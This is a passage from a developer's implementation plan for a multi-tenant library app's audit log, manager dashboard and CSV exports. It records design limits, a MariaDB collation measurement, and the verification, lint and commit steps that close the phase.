- **The dashboard narrowing** — two of BR §16.3's four cards; *Yêu cầu mượn* and *Bình luận chờ duyệt* return with Phase 2's queues **and must be added to `ManagerDashboardQuery` + the page + its tests in the same slice as those queues**, mirroring each queue's own membership rule (the borrow queue counts `pending` AND `approved` — the reference's one subtle count); no activity feed, the audit browser being the feed (the reference's own final state).
- **The three narrowed payloads** and what the expansion consequently cannot show (`credentials.set` nothing — by design; `membership.registered` five keys; `loan.returned`'s condition transition — restored in Step 1, or still narrowed if the owner ruled no, whichever actually shipped).
- **`AuditLogQuery` is the third named exemption in `TenancyArchitectureTest`** — why (AuditLog has no `BelongsToBookshelf`), and where the isolation property now lives (`AuditLogQueryTest`'s two-shelf-plus-global-row test). A Phase 3 cross-shelf audit browser must NOT widen this class — it gets its own query with its own super-admin gate.
- **Exports are deliberately unaudited** (open question 1's ruling and OPS §3.3's still-open question, carried forward), **POST-only** (GET = 405, and why), and **synchronous/streamed but NOT memory-bounded** (open question 5's ruling): the rows and the string grid are built before the streamed response because the callback outlives the tenant binding, so the reference's ~100k-row horizon and the unbounded result set are carried forward as an open limit, with the cursor-plus-captured-shelf-id shape and the queued shape (and its ~1-minute cron latency) recorded as the two fallbacks if scale demands one.
- **The subject join's collation guard, recorded with its MEASUREMENT, not with the intuition** — `docs/known-gaps.md` has been factually wrong six times, and divergence 5's first draft would have been the seventh. Write what was measured on MariaDB 10.11.19: a non-ASCII **constant or bind** against an `ascii_bin` column raises 1267; a non-ASCII value arriving through `JSON_UNQUOTE(JSON_EXTRACT(...))` does **not** (coercibility 4 — the column's collation wins and conversion happens per row, yielding no match). `CONVERT(… USING ascii) COLLATE ascii_bin` is kept as defence in depth, costs no index (`EXPLAIN`: `eq_ref` on `PRIMARY` either way) and changes no matching row, and the hostile-payload test pins the OUTCOME, not the guard. Phase 2's `request.rejected` sentence will need the payload `userId` branch added to this join — one more `coalesce` argument, noted so it is an addition, not a rediscovery.
- **`AuditRecorder` now throws `audit_forbidden_field`** — every future command's payload passes through `AuditSecrets`; the allowed-suffix list is where BR §2-sanctioned metadata (e.g. a future `password_changed_at`) gets its carve-out, never by widening FORBIDDEN. **Its two stated bounds:** it matches KEYS, never values (a secret pasted into `note` is invisible to it), and it walks `before`/`after` only — `context`, which `AuditRecorder` writes as `[]` on every path today, is unchecked, so the first command that puts anything in `context` must widen `assertNoSecrets` in the same commit. It also guards writes from this commit forward only; the 21 shipped payload shapes were verified clean by hand and by the full suite, not retro-scanned in the database.

- [ ] **Step 4: Verify this plan's negative claims, by command**

```bash
# The only RuleViolated literal this branch added is audit_forbidden_field.
# The baseline is 6661991 (origin/main, the 1c merge) spelled explicitly:
# the LOCAL `main` ref in this checkout is stale (a docs-only commit that
# predates all of Phase 0's code), so `git diff main` would diff the whole
# application and return ~28 lines instead of one.
git diff 6661991 -- app/ | grep "^+.*new RuleViolated("
# → exactly one line, the AuditSecrets throw. Then the census suites:
make test FILTER="RuleViolatedCodesHaveSentencesTest|AuditActionCensusTest|TenancyArchitectureTest|RouteOrderTest|FreeTextEncodingGuardTest"
```

All green, plus: `grep -rn "where('bookshelf_id'" app/Queries/ManagerDashboardQuery.php app/Queries/Exports/` returns nothing (only `AuditLogQuery` carries the exempted filter).

- [ ] **Step 5: Full suite, lint, analyse, build**

```bash
make test
make lint && make analyse
bun run build && bun run lint
```

Everything green before any claim of completion (verification before completion — evidence, not assertion).

- [ ] **Step 6: Flip this plan's Status to Complete and commit**

Commit as `docs: phase 1d durable record — ops walk, census, narrowings` (the seeder and any Step 1 amendment ride in their own earlier commits within this task if preferred: seeder as `feat: demo audit rows`, the ReceiveReturn line as `fix: loan.returned records the previous condition`).

---

## Self-review (performed at planning time)

- **Spec coverage:** spec §11 Phase 1's oversight items — "the audit log, the manager dashboard, CSV export" — map to Tasks 3–4, 5–6 and 7–9 respectively; BR §14's four requirements (readable sentences, raw on expansion, same-transaction writes [already shipped, guard added Task 2], fast per-actor answer [the `audit_log_actor` index + actor filter, Task 3]) each have a task and a test. BR §8 is Task 5's whole design. OPS §3.3's five owned rows all land; every excluded row is named with its phase in the header census.
- **Placeholder scan:** no TBDs; every step carries literal code or an exact command. The one deliberate conditional (Task 10 Step 1) is gated on a named open question with a stated default, not left vague.
- **Type consistency:** `AuditSentences::{ACTIONS, GROUPS, sentence, payloadRows, groupOf, actionsInGroup}` are spelled identically in Tasks 1, 3 and 4; `AuditLogQuery::{run, actors}`'s shapes match `AuditLogController` and `audit.tsx`'s `PageProps`; `ManagerDashboardQuery::run()`'s array shape matches `dashboard.tsx`; the export row keys (camelCase) match between the three queries, `ExportTables` and its tests; `Csv::{BOM, line, neutralise, quote}` match between Tasks 7 and 9. Route names `shelves.manage.{dashboard, audit, exports.run}` are consistent across tasks.
- **Known unknowns delegated with instructions, not hand-waved:** model cast names in Task 8 (one named verification step), the census regex's multi-line tolerance in Task 1 (one named grep), helper-name collisions (grep-first noted per fixture).
